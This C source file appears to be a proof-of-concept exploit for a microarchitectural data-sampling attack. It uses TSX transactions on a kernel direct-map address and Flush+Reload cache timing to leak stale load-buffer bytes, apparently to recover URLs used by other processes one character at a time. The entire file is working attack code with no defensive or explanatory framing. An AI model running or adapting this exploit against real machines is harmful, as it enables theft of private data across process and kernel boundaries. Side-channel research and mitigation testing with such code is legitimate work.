#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <memory.h>
#include <sys/mman.h>

#include <immintrin.h>

#include "cacheutils.h"

#define FROM '$'//0x20
#define TO 'z'//0x7D
#define SECRET_LEN 64
#define THRESHLOD 0
#define DEFAULT_URL "www."
#define MAX_TRIES 10000
#define MAX_INDEX 64

char __attribute__((aligned(4096))) mem[256 * 4096];
int hist[64][256];
unsigned char secret[SECRET_LEN+1] = {0};
size_t found_index = 0;

int recover(size_t index);

int main(int argc, char *argv[]) {

  memcpy(secret, DEFAULT_URL, strlen(DEFAULT_URL)+1);
  found_index = strlen(DEFAULT_URL);
  printf("starting with: %s\n", secret);
  fflush(stdout);

  // Initialize and flush LUT
  memset(mem, 0, sizeof(mem));

  for (size_t i = 0; i < 256; i++) {
    flush(mem + i * 4096);
  }

  // Get a valid page and its direct physical map address (i.e., a kernel mapping to the page)
  char *mapping = (char *)mmap(0, 4096, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
  memset(mapping, 1, 4096);
  size_t paddr = get_physical_address((size_t)mapping);
  if (!paddr) {
    printf("[!] Could not get physical address! Did you start as root?\n");
    exit(1);
  }
  char *target = (char *)(get_direct_physical_map() + paddr);

  // printf("[+] Kernel address: %p\n", target);

  // Calculate Flush+Reload threshold
  CACHE_MISS = detect_flush_reload_threshold();
  fprintf(stderr, "[+] Flush+Reload Threshold: %zu\n", CACHE_MISS);

  // setup signal handler
  signal(SIGSEGV, trycatch_segfault_handler);

  while(1)
  {
    register size_t index = 0;
    while (found_index < SECRET_LEN) {
      unsigned int try = 0;
      char found = 0;
      // printf("\x1b[2J");
      fprintf(stderr, "\rindex: %2lu", index);
      fprintf(stderr, " found: %2lu", found_index);
      fflush(stderr);
      memset(hist[index], 0, 256 * sizeof(int));
      while(1)//try++ < MAX_TRIES)
      {
        register uint64_t mask = *((uint64_t *)&secret[found_index - 4]) & 0xffffffff;
        // printf("0x%08lx\n", mask);
        // Ensure the kernel mapping refers to a value not in the cache
        flush(mapping);

        // Dereference the kernel address and encode in LUT
        // Not in cache -> reads load buffer entry
        if (_xbegin() == _XBEGIN_STARTED)
        {
          maccess(0);
          register uint64_t bytes = *((uint64_t *)&target[index]) & 0xffffffffff;
          maccess(mem + 4096 * (((bytes ^ mask) >> 32 | (bytes ^ mask) << 32)));
          _xend();
        }
        else
        {
          if(recover(index))
          {
            found = 1;
            break;
          }
        }
        
      }
      index = (index + 1) % MAX_INDEX;
      // if (!found)
      //   found_index = strlen(DEFAULT_URL);
      if (found)
        printf("\rrecovering: %s\n", secret);
    }
    printf("\rrecovered: %s\n", secret);
    memset(secret, 0, SECRET_LEN + 1);
    memcpy(secret, DEFAULT_URL, strlen(DEFAULT_URL)+1);
    found_index = strlen(DEFAULT_URL);
  }
  return 0;
}

int recover(size_t index)
{
  // Recover value from cache and update histogram
  int update = 0;
  for (size_t i = FROM; i <= TO; i++) {
    if (flush_reload((char *)mem + 4096 * i + index)) {
      hist[index][i]++;
      update = 1;
    }
  }

  // If new hit, display histogram
  if (update) {
    int max = 0;
    int max_index = -1;
    for (int i = FROM; i <= TO; i++) {
      if (hist[index][i] > max)
      {
        max = hist[index][i];
        max_index = i;
      }
    }
    // for (int i = FROM; i <= TO; i++) {
    //   if (hist[index][i] > THRESHLOD / 5)
    //   {
    //     printf("%c: (%4d) ", i, hist[index][i]);
    //     for (int j = 0; j < hist[index][i] * 60 / max; j++) {
    //       printf("#");
    //     }
    //     printf("\n");
    //   }
    // }
    // ######
    // printf("[DEBUG]: ");
    // for (int j = 0; j < found_index; j++)
    // {
    //   printf("0x%x ", secret[j]);
    // }
    // printf("\n");
    // #####
    // printf("recovered: %s", secret);
    fflush(stdout);
    // if over selection threshold accept as leaked byte
    if(max > THRESHLOD)
    {
      secret[found_index++] = (char) max_index;
      // printf("\rrecovered: %s\n", secret);
      return 1;
    }
    else
    {
      // printf("\n");
      return 0;
    }
    
  }
  else
  {
    return 0;
  }
  
}
